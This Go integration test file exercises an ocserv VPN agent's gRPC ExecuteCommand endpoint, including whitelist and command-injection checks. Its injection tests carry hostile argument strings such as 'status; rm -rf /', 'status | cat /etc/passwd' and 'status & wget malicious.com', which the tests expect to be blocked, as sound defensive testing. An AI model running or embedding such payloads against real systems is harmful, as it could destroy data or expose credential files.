//go:build integration

package grpc_test

import (
	"context"
	"fmt"
	"testing"
	"time"

	grpctestutil "github.com/dantte-lp/ocserv-agent/internal/testutil/grpc"
	pb "github.com/dantte-lp/ocserv-agent/pkg/proto/agent/v1"
)

// TestExecuteCommandOcctl tests ExecuteCommand RPC with occtl commands
func TestExecuteCommandOcctl(t *testing.T) {
	// Note: This test requires the mock ocserv socket to be running
	// For now, we test the RPC layer without real socket
	// TODO: Integrate with mock-ocserv from docker-compose

	// Start test server (without mock socket for now)
	server := grpctestutil.NewTestServer(t, grpctestutil.DefaultServerOptions())

	// Create test client
	certFile, keyFile, caFile := server.GetCertFiles()
	clientOpts := grpctestutil.DefaultClientOptions()
	clientOpts.CertFile = certFile
	clientOpts.KeyFile = keyFile
	clientOpts.CAFile = caFile

	client := grpctestutil.NewTestClient(t, server.Address, clientOpts)

	tests := []struct {
		name        string
		requestID   string
		commandType string
		args        []string
		wantSuccess bool
		wantError   string
	}{
		{
			name:        "occtl show users",
			requestID:   "req-001",
			commandType: "occtl",
			args:        []string{"show", "users"},
			wantSuccess: false, // Will fail without socket
			wantError:   "",    // But should not panic
		},
		{
			name:        "occtl show status",
			requestID:   "req-002",
			commandType: "occtl",
			args:        []string{"show", "status"},
			wantSuccess: false,
			wantError:   "",
		},
		{
			name:        "occtl disconnect user",
			requestID:   "req-003",
			commandType: "occtl",
			args:        []string{"disconnect", "user", "testuser"},
			wantSuccess: false,
			wantError:   "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()

			req := &pb.CommandRequest{
				RequestId:   tt.requestID,
				CommandType: tt.commandType,
				Args:        tt.args,
			}

			resp, err := client.Client.ExecuteCommand(ctx, req)

			if err != nil {
				t.Logf("RPC error (expected without socket): %v", err)
				// RPC level errors are acceptable since we don't have real socket
				return
			}

			// Check response structure
			if resp.RequestId != tt.requestID {
				t.Errorf("RequestId = %v, want %v", resp.RequestId, tt.requestID)
			}

			t.Logf("ExecuteCommand response: success=%v, exit_code=%d, stdout=%q, stderr=%q",
				resp.Success, resp.ExitCode, resp.Stdout, resp.Stderr)
		})
	}
}

// TestExecuteCommandSystemctl tests ExecuteCommand RPC with systemctl commands
func TestExecuteCommandSystemctl(t *testing.T) {
	// Start test server
	server := grpctestutil.NewTestServer(t, grpctestutil.DefaultServerOptions())

	// Create test client
	certFile, keyFile, caFile := server.GetCertFiles()
	clientOpts := grpctestutil.DefaultClientOptions()
	clientOpts.CertFile = certFile
	clientOpts.KeyFile = keyFile
	clientOpts.CAFile = caFile

	client := grpctestutil.NewTestClient(t, server.Address, clientOpts)

	tests := []struct {
		name        string
		requestID   string
		commandType string
		args        []string
		wantSuccess bool
	}{
		{
			name:        "systemctl status",
			requestID:   "req-101",
			commandType: "systemctl",
			args:        []string{"status"},
			wantSuccess: false, // Will fail without real service
		},
		{
			name:        "systemctl is-active",
			requestID:   "req-102",
			commandType: "systemctl",
			args:        []string{"is-active"},
			wantSuccess: false,
		},
		{
			name:        "systemctl is-enabled",
			requestID:   "req-103",
			commandType: "systemctl",
			args:        []string{"is-enabled"},
			wantSuccess: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()

			req := &pb.CommandRequest{
				RequestId:   tt.requestID,
				CommandType: tt.commandType,
				Args:        tt.args,
			}

			resp, err := client.Client.ExecuteCommand(ctx, req)

			if err != nil {
				t.Logf("RPC error (expected without real service): %v", err)
				return
			}

			// Check response structure
			if resp.RequestId != tt.requestID {
				t.Errorf("RequestId = %v, want %v", resp.RequestId, tt.requestID)
			}

			t.Logf("ExecuteCommand response: success=%v, exit_code=%d",
				resp.Success, resp.ExitCode)
		})
	}
}

// TestExecuteCommandNotAllowed tests command not in whitelist
func TestExecuteCommandNotAllowed(t *testing.T) {
	// Start test server
	server := grpctestutil.NewTestServer(t, grpctestutil.DefaultServerOptions())

	// Create test client
	certFile, keyFile, caFile := server.GetCertFiles()
	clientOpts := grpctestutil.DefaultClientOptions()
	clientOpts.CertFile = certFile
	clientOpts.KeyFile = keyFile
	clientOpts.CAFile = caFile

	client := grpctestutil.NewTestClient(t, server.Address, clientOpts)

	tests := []struct {
		name        string
		commandType string
		args        []string
		wantError   string
	}{
		{
			name:        "rm command not allowed",
			commandType: "rm",
			args:        []string{"-rf", "/tmp/test"},
			wantError:   "command not allowed",
		},
		{
			name:        "wget command not allowed",
			commandType: "wget",
			args:        []string{"http://example.com"},
			wantError:   "command not allowed",
		},
		{
			name:        "unknown command type",
			commandType: "unknown",
			args:        []string{"test"},
			wantError:   "unknown command type",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()

			req := &pb.CommandRequest{
				RequestId:   "req-security-" + tt.name,
				CommandType: tt.commandType,
				Args:        tt.args,
			}

			resp, err := client.Client.ExecuteCommand(ctx, req)

			if err != nil {
				// gRPC level error might occur
				t.Logf("Got RPC error: %v", err)
				return
			}

			// Should fail at application level
			if resp.Success {
				t.Error("Expected command to fail, but it succeeded")
			}

			if resp.ErrorMessage == "" {
				t.Error("Expected error message, got empty string")
			}

			t.Logf("Got expected error: %s", resp.ErrorMessage)
		})
	}
}

// TestExecuteCommandInvalidArguments tests command injection prevention
func TestExecuteCommandInvalidArguments(t *testing.T) {
	// Start test server
	server := grpctestutil.NewTestServer(t, grpctestutil.DefaultServerOptions())

	// Create test client
	certFile, keyFile, caFile := server.GetCertFiles()
	clientOpts := grpctestutil.DefaultClientOptions()
	clientOpts.CertFile = certFile
	clientOpts.KeyFile = keyFile
	clientOpts.CAFile = caFile

	client := grpctestutil.NewTestClient(t, server.Address, clientOpts)

	injectionAttempts := []struct {
		name string
		args []string
	}{
		{
			name: "semicolon injection",
			args: []string{"status; rm -rf /"},
		},
		{
			name: "pipe injection",
			args: []string{"status | cat /etc/passwd"},
		},
		{
			name: "ampersand injection",
			args: []string{"status & wget malicious.com"},
		},
		{
			name: "backtick injection",
			args: []string{"status `whoami`"},
		},
		{
			name: "dollar injection",
			args: []string{"status $(whoami)"},
		},
		{
			name: "newline injection",
			args: []string{"status\nrm -rf /"},
		},
		{
			name: "null byte injection",
			args: []string{"status\x00rm -rf /"},
		},
	}

	for _, tt := range injectionAttempts {
		t.Run(tt.name, func(t *testing.T) {
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()

			req := &pb.CommandRequest{
				RequestId:   "req-injection-" + tt.name,
				CommandType: "systemctl",
				Args:        tt.args,
			}

			resp, err := client.Client.ExecuteCommand(ctx, req)

			if err != nil {
				t.Logf("Got RPC error (good, injection prevented): %v", err)
				return
			}

			// Should fail at validation level
			if resp.Success {
				t.Errorf("Injection attempt succeeded! This is a security vulnerability!")
			}

			if resp.ErrorMessage == "" {
				t.Error("Expected error message for injection attempt")
			}

			t.Logf("Injection prevented: %s", resp.ErrorMessage)
		})
	}
}

// TestExecuteCommandTimeout tests timeout handling
func TestExecuteCommandTimeout(t *testing.T) {
	// Start test server
	server := grpctestutil.NewTestServer(t, grpctestutil.DefaultServerOptions())

	// Create test client
	certFile, keyFile, caFile := server.GetCertFiles()
	clientOpts := grpctestutil.DefaultClientOptions()
	clientOpts.CertFile = certFile
	clientOpts.KeyFile = keyFile
	clientOpts.CAFile = caFile
	clientOpts.Timeout = 10 * time.Second

	client := grpctestutil.NewTestClient(t, server.Address, clientOpts)

	// Use a very short timeout
	ctx, cancel := context.WithTimeout(context.Background(), 100*time.Millisecond)
	defer cancel()

	req := &pb.CommandRequest{
		RequestId:   "req-timeout-001",
		CommandType: "occtl",
		Args:        []string{"show", "users"},
	}

	// Wait for context to expire
	time.Sleep(200 * time.Millisecond)

	_, err := client.Client.ExecuteCommand(ctx, req)

	if err == nil {
		t.Error("Expected timeout error, got nil")
		return
	}

	t.Logf("Got expected timeout error: %v", err)
}

// TestExecuteCommandRequestID tests request ID propagation
func TestExecuteCommandRequestID(t *testing.T) {
	// Start test server
	server := grpctestutil.NewTestServer(t, grpctestutil.DefaultServerOptions())

	// Create test client
	certFile, keyFile, caFile := server.GetCertFiles()
	clientOpts := grpctestutil.DefaultClientOptions()
	clientOpts.CertFile = certFile
	clientOpts.KeyFile = keyFile
	clientOpts.CAFile = caFile

	client := grpctestutil.NewTestClient(t, server.Address, clientOpts)

	// Test multiple requests with different IDs
	requestIDs := []string{
		"req-001",
		"req-002-special-chars-!@#$%",
		"req-003-very-long-" + string(make([]byte, 100)),
		"",
	}

	for i, reqID := range requestIDs {
		t.Run(fmt.Sprintf("request_%d", i), func(t *testing.T) {
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()

			req := &pb.CommandRequest{
				RequestId:   reqID,
				CommandType: "occtl",
				Args:        []string{"show", "users"},
			}

			resp, err := client.Client.ExecuteCommand(ctx, req)

			if err != nil {
				t.Logf("RPC error: %v", err)
				return
			}

			if resp.RequestId != reqID {
				t.Errorf("RequestId not propagated: got %q, want %q", resp.RequestId, reqID)
			}

			t.Logf("Request ID propagated correctly: %q", resp.RequestId)
		})
	}
}

// TestExecuteCommandConcurrent tests concurrent ExecuteCommand calls
func TestExecuteCommandConcurrent(t *testing.T) {
	// Start test server
	server := grpctestutil.NewTestServer(t, grpctestutil.DefaultServerOptions())

	// Create test client
	certFile, keyFile, caFile := server.GetCertFiles()
	clientOpts := grpctestutil.DefaultClientOptions()
	clientOpts.CertFile = certFile
	clientOpts.KeyFile = keyFile
	clientOpts.CAFile = caFile

	client := grpctestutil.NewTestClient(t, server.Address, clientOpts)

	// Run 10 concurrent requests
	const numRequests = 10
	done := make(chan bool, numRequests)
	errors := make(chan error, numRequests)

	for i := 0; i < numRequests; i++ {
		go func(id int) {
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()

			req := &pb.CommandRequest{
				RequestId:   fmt.Sprintf("concurrent-req-%d", id),
				CommandType: "occtl",
				Args:        []string{"show", "users"},
			}

			resp, err := client.Client.ExecuteCommand(ctx, req)

			if err != nil {
				// Expected without socket
				done <- true
				return
			}

			if resp.RequestId != req.RequestId {
				errors <- fmt.Errorf("request %d: ID mismatch", id)
				done <- false
				return
			}

			done <- true
		}(i)
	}

	// Wait for all requests to complete
	successCount := 0
	for i := 0; i < numRequests; i++ {
		if <-done {
			successCount++
		}
	}

	close(errors)

	// Check for errors
	for err := range errors {
		t.Error(err)
	}

	t.Logf("Completed %d concurrent requests", successCount)
}

// TestExecuteCommandWithMockSocket tests with real mock socket (if available)
func TestExecuteCommandWithMockSocket(t *testing.T) {
	// Check if mock socket is available in compose environment
	mockSocketPath := "/tmp/occtl-test.socket"

	// For now, skip if socket doesn't exist
	t.Logf("Mock socket path: %s", mockSocketPath)
	t.Logf("Note: This test requires mock-ocserv to be running in compose")

	// Create server with mock socket
	serverOpts := grpctestutil.DefaultServerOptions()
	serverOpts.MockOcservSocket = mockSocketPath

	server := grpctestutil.NewTestServer(t, serverOpts)

	// Create test client
	certFile, keyFile, caFile := server.GetCertFiles()
	clientOpts := grpctestutil.DefaultClientOptions()
	clientOpts.CertFile = certFile
	clientOpts.KeyFile = keyFile
	clientOpts.CAFile = caFile

	client := grpctestutil.NewTestClient(t, server.Address, clientOpts)

	t.Run("show users with mock socket", func(t *testing.T) {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()

		req := &pb.CommandRequest{
			RequestId:   "mock-socket-001",
			CommandType: "occtl",
			Args:        []string{"show", "users"},
		}

		resp, err := client.Client.ExecuteCommand(ctx, req)

		if err != nil {
			t.Logf("RPC error (socket might not be available): %v", err)
			t.Skip("Skipping test - mock socket not available")
			return
		}

		t.Logf("ExecuteCommand with mock socket: success=%v, stdout length=%d",
			resp.Success, len(resp.Stdout))

		// If socket is available, we should get a response
		if resp.Success && len(resp.Stdout) > 0 {
			t.Logf("Mock socket is working! Got stdout: %s", resp.Stdout[:min(100, len(resp.Stdout))])
		}
	})
}

// min returns the minimum of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
